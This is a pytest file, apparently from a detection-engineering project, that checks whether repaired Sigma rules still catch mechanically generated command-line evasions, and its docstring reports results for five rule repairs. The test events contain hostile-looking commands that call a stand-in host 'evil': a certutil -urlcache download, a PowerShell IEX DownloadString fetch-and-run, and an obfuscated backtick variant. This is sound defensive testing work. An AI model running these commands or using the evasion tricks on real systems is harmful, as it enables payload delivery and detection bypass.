"""Stage 3 Phase 2, Part 4: re-run Phase 1's five hand-made repairs through
the full gate with mechanically-generated evasions instead of hand-picked
ones, and check whether the verdicts hold.

Same rules, same original-TP events, same benign sets as Phase 1
(tests/test_gate_hand_repairs.py) - only the EVASION events change: instead
of one hand-authored evasion per case, mechanic.evasion finds the rule's
own fragile atom(s) and generates+confirms every mechanical candidate it
can. No LLM anywhere here.

RESULTS, and why (full detail in RESULTS.md / docs/stage3-phase2-status.md):

  R1  PASS, matches Phase 1 - but EVASIONS_CAUGHT is NOT APPLICABLE (zero
      mechanical evasions exist for a bare filename atom - the real evasion
      class here is rename, outside the five Uetz techniques' bounded
      scope). This PASS is not evidence R1's repair resists evasion; it
      only shows no regression on the TP/benign set. gate.fully_exercised
      is False here.
  R2  FLIPS to FAIL - matches Phase 1 on conditions 2/3/4, but a
      character_insertion candidate that fragments "urlcache" (a token
      BOTH the original and the repaired `contains|all` rule depend on)
      evades the repaired rule too, which Phase 1's single hand-picked
      reordering evasion never exercised. Genuine broader coverage - see
      the module-level comment below for the important operational-realism
      caveat on this specific candidate.
  R3  FAIL, matches Phase 1 - now against 6 confirmed mechanical evasions
      instead of 1, all of which the over-broad repair still (correctly,
      for the wrong reasons) catches; still fails on NO_NEW_FALSE_POSITIVES
      for the same reason as Phase 1.
  R4  FAIL, matches Phase 1 - now against 6 confirmed mechanical evasions,
      none of which the insufficient repair catches (stronger evidence
      than Phase 1's single evasion).
  R5  FLIPS to PASS - zero mechanical evasions exist for a raw IOC field
      (DestinationIp isn't command-line-shaped), so EVASIONS_CAUGHT is
      NOT APPLICABLE and the verdict rests entirely on conditions 2-4,
      which the widened-but-still-not-durable repair trivially satisfies.
      gate.fully_exercised is False. THIS IS THE MOST IMPORTANT FINDING OF
      PART 4: a real repair-verification gap for IOC-tier rules, not a
      gate bug - see docs/stage3-phase2-status.md for the full discussion
      and recommendation.
"""

from pathlib import Path

import pytest

from mechanic import evasion, gate, verify

try:
    verify.find_rsigma_binary()
    _RSIGMA_AVAILABLE = True
    _RSIGMA_SKIP_REASON = ""
except verify.VerifyError as e:
    _RSIGMA_AVAILABLE = False
    _RSIGMA_SKIP_REASON = str(e)

pytestmark = pytest.mark.skipif(not _RSIGMA_AVAILABLE, reason=_RSIGMA_SKIP_REASON)

# Reuse Phase 1's exact rule text, unchanged - import the constants directly
# rather than retyping them, so there is no risk of silently testing a
# different rule than Phase 1 proved.
import test_gate_hand_repairs as phase1  # noqa: E402  (sys.path includes tests/ under pytest's rootdir)


def _write(tmp_path: Path, name: str, text: str) -> Path:
    p = tmp_path / name
    p.write_text(text)
    return p


def _run_mechanical(tmp_path, name, original_text, repaired_text, tp_event, benign):
    original = _write(tmp_path, f"{name}_o.yml", original_text)
    repaired = _write(tmp_path, f"{name}_r.yml", repaired_text)
    labeled, discarded, fragile, tier = evasion.generate_confirmed_evasions_for_rule(original, tp_event)
    malicious = [gate.LabeledEvent(tp_event, "original_tp", "unchanged from Phase 1")] + labeled
    report = gate.run_gate(original, repaired, malicious, benign)
    return report, labeled, discarded, fragile, tier


def test_r1_rename_fix_still_passes_but_evasion_condition_is_not_applicable(tmp_path):
    tp_event = {"Image": "C:\\Windows\\System32\\whoami.exe", "OriginalFileName": "whoami.exe", "CommandLine": "whoami.exe"}
    benign = [{"Image": "C:\\Windows\\System32\\notepad.exe", "OriginalFileName": "NOTEPAD.EXE", "CommandLine": "notepad.exe"}]
    report, labeled, discarded, fragile, tier = _run_mechanical(
        tmp_path, "r1", phase1.R1_ORIGINAL, phase1.R1_REPAIRED, tp_event, benign
    )
    assert labeled == [], "expected zero mechanical evasions for a bare filename atom"
    assert report.verdict == "PASS", report.to_dict()
    assert report.condition("EVASIONS_CAUGHT").applicable is False
    assert report.fully_exercised is False


def test_r2_arg_order_fix_flips_to_fail_under_broader_mechanical_evasions(tmp_path):
    tp_event = {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe"}
    benign = [{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -hashfile a.exe SHA256"}]
    report, labeled, discarded, fragile, tier = _run_mechanical(
        tmp_path, "r2", phase1.R2_ORIGINAL, phase1.R2_REPAIRED, tp_event, benign
    )
    assert len(labeled) >= 2  # at least the reordering evasion Phase 1 found by hand, plus more
    # Phase 1's own hand-picked reordering evasion IS in the confirmed set -
    # the repair still resists that one specifically.
    reordering_literals = {le.event["CommandLine"] for le in labeled if "reordering" in le.provenance}
    assert "certutil.exe -f -urlcache http://evil/a.exe a.exe" in reordering_literals

    assert report.verdict == "FAIL", report.to_dict()
    assert report.fully_exercised is True  # every condition WAS exercised this time
    evasions_cond = report.condition("EVASIONS_CAUGHT")
    assert evasions_cond.passed is False
    # confirm it's specifically the "urlcache" character-insertion candidate that got through -
    # the repair's `contains|all: [-urlcache, -f]` depends on "-urlcache" surviving intact,
    # and the transformer's mechanical fragmentation of that token breaks BOTH rules' match on
    # it, not just the original's - a real, if bounded/mechanical, coverage gap the repair was
    # never designed to resist (this specific candidate also has the operational-realism caveat
    # from mechanic/evasion.py's docstring: backtick-insertion is a PowerShell convention, and
    # this event's Image is certutil.exe, typically launched via cmd.exe - the harness confirms
    # the RULE TEXT no longer matches, not that this exact string is what a real cmd.exe-launched
    # certutil invocation would look like).
    urlcache_idx = next(i for i, le in enumerate(labeled) if "u`r`l`c`a`c`h`e" in le.event["CommandLine"])
    assert evasions_cond.evidence["repaired_fired"][urlcache_idx] is False


def test_r3_overly_broad_repair_still_rejected_under_mechanical_evasions(tmp_path):
    tp_event = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    benign = [
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\Backup.ps1"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 10}"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command \"Get-ChildItem C:\\Logs\""},
    ]
    report, labeled, discarded, fragile, tier = _run_mechanical(
        tmp_path, "r3", phase1.R3_ORIGINAL, phase1.R3_BAD_REPAIR, tp_event, benign
    )
    assert len(labeled) >= 1
    assert report.verdict == "FAIL", (
        f"GATE IS BROKEN under mechanical evasions too: {report.to_dict()}"
    )
    assert report.condition("EVASIONS_CAUGHT").passed is True  # still catches them, same as Phase 1
    fp_condition = report.condition("NO_NEW_FALSE_POSITIVES")
    assert fp_condition.passed is False
    assert fp_condition.evidence["new_fps"] == [0, 1, 2]


def test_r4_insufficient_repair_still_rejected_under_mechanical_evasions(tmp_path):
    tp_event = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    benign = [{"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\Backup.ps1"}]
    report, labeled, discarded, fragile, tier = _run_mechanical(
        tmp_path, "r4", phase1.R3_ORIGINAL, phase1.R4_INSUFFICIENT_REPAIR, tp_event, benign
    )
    assert len(labeled) >= 1
    assert report.verdict == "FAIL", report.to_dict()
    evasions_cond = report.condition("EVASIONS_CAUGHT")
    assert evasions_cond.passed is False
    assert report.condition("NO_NEW_FALSE_POSITIVES").passed is True
    # stronger than Phase 1: NONE of the mechanical evasions are caught, not just one
    not_fired = [i for i, fired in enumerate(evasions_cond.evidence["repaired_fired"]) if fired is False]
    assert len(not_fired) == len(labeled)


def test_r5_ioc_retire_flips_to_pass_but_not_fully_exercised_the_key_part4_finding(tmp_path):
    """THE load-bearing case for Part 4, the same role R3 played for Part 3:
    a raw-IOC rule's repair reaches PASS purely because zero mechanical
    evasions exist for a DestinationIp atom (by design - see
    mechanic/evasion.py). This is NOT the gate being broken (it did exactly
    what its inputs told it to); it's real evidence that mechanical
    evasions alone are insufficient to trust a PASS for IOC-tier rules -
    gate.fully_exercised is the signal that catches this, and callers MUST
    check it before trusting a PASS the way they trusted Phase 1's fully-
    exercised R1/R2 PASSes."""
    tp_event = {"DestinationIp": "203.0.113.77"}
    benign = [{"DestinationIp": "93.184.216.34"}]
    report, labeled, discarded, fragile, tier = _run_mechanical(
        tmp_path, "r5", phase1.R5_ORIGINAL, phase1.R5_ATTEMPTED_REPAIR, tp_event, benign
    )
    assert tier == "IOC"
    assert labeled == [], "expected zero mechanical evasions for a raw IOC atom - none of the 5 Uetz techniques apply"
    assert discarded == []  # nothing was even generated to discard - zero candidates, not zero-after-rejection

    assert report.verdict == "PASS", report.to_dict()
    assert report.condition("EVASIONS_CAUGHT").applicable is False
    assert report.fully_exercised is False, (
        "a PASS resting on a not-applicable EVASIONS_CAUGHT must be flagged as not fully exercised - "
        "this is exactly the case that must never be silently reported the same as a real PASS"
    )
